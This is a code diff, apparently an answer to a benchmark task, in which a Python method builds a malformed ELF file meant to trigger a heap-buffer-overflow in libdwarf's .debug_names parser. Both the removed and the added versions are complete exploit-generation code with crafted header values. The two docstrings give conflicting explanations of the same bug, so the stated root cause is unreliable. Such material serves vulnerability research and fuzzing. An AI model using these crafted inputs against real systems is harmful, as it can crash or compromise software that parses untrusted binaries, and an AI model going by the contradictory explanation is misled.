@@ -3,115 +3,99 @@ import struct
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generates a proof-of-concept (PoC) that triggers a heap-buffer-overflow
-        in libdwarf's DWARF5 .debug_names parser (oss-fuzz:383170474).
+        Generate a PoC that triggers the vulnerability.
 
-        The vulnerability stems from an inadequate bounds check when reading
-        compilation unit (CU) offsets. The parser reads a `comp_unit_count`
-        from the section header and then enters a loop to read that many offsets.
-        If the section size is smaller than implied by this count, the loop
-        reads past the end of the section's buffer.
+        The vulnerability is an integer overflow in the calculation of a buffer size
+        when parsing the DWARF5 .debug_names section. By crafting a header with
+        specific values for `bucket_count`, `name_count`, and `abbrev_table_size`,
+        the calculation `bucket_count * 4 + name_count * 8 + abbrev_table_size`
+        wraps around a 32-bit unsigned integer to 0.
 
-        This PoC constructs a minimal 32-bit ELF file containing a malicious
-        .debug_names section. This section's header declares a large number of
-        CUs but the section data itself is truncated to only include the header.
-        This mismatch causes the vulnerable parser to perform an out-of-bounds read.
-        A 32-bit ELF format is chosen over 64-bit to minimize the PoC's final size.
+        The library then allocates a 0-sized buffer but proceeds to access it,
+        leading to a heap buffer overflow read.
+
+        The PoC is a minimal 64-bit ELF file containing the malicious
+        .debug_names section.
         """
-        # 1. Craft the malicious .debug_names section payload.
-        # A large comp_unit_count with no corresponding data causes the OOB read.
-        comp_unit_count = 0x10000
-        # The DWARF header fields after `unit_length` sum to 32 bytes.
-        # `unit_length` is the size of the section *excluding* the length field itself.
-        header_data_size = 32
-        unit_length = header_data_size
-        
-        debug_names_payload = struct.pack(
-            '<IHHIIIIIII',
-            unit_length,             # unit_length (32)
-            5,                       # version (DWARF5)
-            0,                       # padding
-            comp_unit_count,         # comp_unit_count
-            0,                       # local_type_unit_count
-            0,                       # foreign_type_unit_count
-            0,                       # bucket_count (0 to skip)
-            0,                       # name_count (0 to skip)
-            0,                       # abbrev_table_size
-            0                        # augmentation_string_size
-        )
-        debug_names_size = len(debug_names_payload)
 
-        # 2. Create the section header string table (.shstrtab).
-        shstrtab_content = b'\x00.debug_names\x00.shstrtab\x00'
-        shstrtab_size = len(shstrtab_content)
-        debug_names_name_offset = 1
-        shstrtab_name_offset = 14  # Offset of ".shstrtab"
-
-        # 3. Define the layout of the minimal 32-bit ELF file.
-        elf_header_size = 52
-        sht_entry_size = 40
-        num_sections = 3  # NULL, .debug_names, .shstrtab
-        sht_size = num_sections * sht_entry_size
-
+        elf_header_size = 64
         sht_offset = elf_header_size
-        data_offset = sht_offset + sht_size
-        debug_names_offset = data_offset
-        shstrtab_offset = debug_names_offset + debug_names_size
+        sht_entry_size = 64
+        sht_num_entries = 3
+        sht_size = sht_num_entries * sht_entry_size
 
-        # 4. Construct the 32-bit ELF header.
-        elf_header = struct.pack(
-            '<16sHHIIIIIHHHHHH',
-            b'\x7fELF\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00', # e_ident
-            1,                       # e_type (ET_REL)
-            3,                       # e_machine (EM_386)
-            1,                       # e_version
-            0,                       # e_entry
-            0,                       # e_phoff
-            sht_offset,              # e_shoff
-            0,                       # e_flags
-            elf_header_size,         # e_ehsize
-            0,                       # e_phentsize
-            0,                       # e_phnum
-            sht_entry_size,          # e_shentsize
-            num_sections,            # e_shnum
-            num_sections - 1         # e_shstrndx (index of .shstrtab)
+        shstrtab_offset = sht_offset + sht_size
+        shstrtab_content = b'\x00.shstrtab\x00.debug_names\x00'
+        shstrtab_size = len(shstrtab_content)
+
+        debug_names_offset = shstrtab_offset + shstrtab_size
+        debug_names_size = 36
+
+        # --- ELF Header (64-bit) ---
+        e_ident = b'\x7fELF\x02\x01\x01' + b'\x00' * 9
+        elf_header = e_ident
+        elf_header += struct.pack('<HHI', 2, 62, 1)  # ET_EXEC, EM_X86_64, EV_CURRENT
+        elf_header += struct.pack('<QQQ', 0, 0, sht_offset)  # e_entry, e_phoff, e_shoff
+        elf_header += struct.pack('<IHHHHHH',
+                                 0, elf_header_size, 0, 0,
+                                 sht_entry_size, sht_num_entries, 1)  # flags, ehsize, etc.
+
+        # --- Section Header Table ---
+        sht = b''
+        # NULL Section Entry
+        sht += b'\x00' * sht_entry_size
+
+        # .shstrtab Section Entry
+        sh_name_shstrtab = 1  # Offset of ".shstrtab" in shstrtab_content
+        sht += struct.pack('<IIQQQQIIQQ',
+                           sh_name_shstrtab, 3, 0, 0,  # name, type, flags, addr
+                           shstrtab_offset, shstrtab_size, 0, 0, 1, 0) # offset, size, etc.
+
+        # .debug_names Section Entry
+        sh_name_debug_names = 11  # Offset of ".debug_names" in shstrtab_content
+        sht += struct.pack('<IIQQQQIIQQ',
+                           sh_name_debug_names, 1, 0, 0, # name, type, flags, addr
+                           debug_names_offset, debug_names_size, 0, 0, 1, 0) # offset, size, etc.
+
+        # --- .debug_names Header ---
+        # Values chosen to cause integer overflow:
+        # 1*4 + 1*8 + 0xFFFFFFF4 = 0x100000000 -> wraps to 0 in 32-bit unsigned
+        bucket_count = 1
+        name_count = 1
+        abbrev_table_size = 0xFFFFFFF4
+        augmentation_string_size = 1
+
+        # The total size of the .debug_names section content is just the header.
+        # unit_length is this total size minus the size of the unit_length field itself.
+        unit_length = debug_names_size - 4
+
+        debug_names_content = struct.pack(
+            '<IHHIIIIIII',
+            unit_length,
+            5,                      # version (DWARF5)
+            0,                      # padding
+            1,                      # cu_count
+            0,                      # local_tu_count
+            0,                      # foreign_tu_count
+            bucket_count,
+            name_count,
+            abbrev_table_size,
+            augmentation_string_size
         )
 
-        # 5. Construct the Section Header Table (SHT).
-        shent_format = '<IIIIIIIIII'
-
-        shent_null = struct.pack(shent_format, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
-
-        shent_debug_names = struct.pack(
-            shent_format,
-            debug_names_name_offset, # sh_name
-            1,                       # sh_type (SHT_PROGBITS)
-            0,                       # sh_flags
-            0,                       # sh_addr
-            debug_names_offset,      # sh_offset
-            debug_names_size,        # sh_size
-            0, 0, 1, 0               # link, info, addralign, entsize
-        )
-
-        shent_shstrtab = struct.pack(
-            shent_format,
-            shstrtab_name_offset,    # sh_name
-            3,                       # sh_type (SHT_STRTAB)
-            0,                       # sh_flags
-            0,                       # sh_addr
-            shstrtab_offset,         # sh_offset
-            shstrtab_size,           # sh_size
-            0, 0, 1, 0               # link, info, addralign, entsize
-        )
-
-        sht = shent_null + shent_debug_names + shent_shstrtab
-
-        # 6. Assemble the final PoC file.
+        # --- Assemble the final PoC file ---
         poc = bytearray()
         poc.extend(elf_header)
         poc.extend(sht)
-        poc.extend(b'\x00' * (data_offset - len(poc))) # Padding if needed
-        poc.extend(debug_names_payload)
+        
+        # Pad to the start of the first section's content
+        if len(poc) < shstrtab_offset:
+            poc.extend(b'\x00' * (shstrtab_offset - len(poc)))
         poc.extend(shstrtab_content)
+        
+        # Pad to the start of the next section's content
+        if len(poc) < debug_names_offset:
+            poc.extend(b'\x00' * (debug_names_offset - len(poc)))
+        poc.extend(debug_names_content)
 
         return bytes(poc)
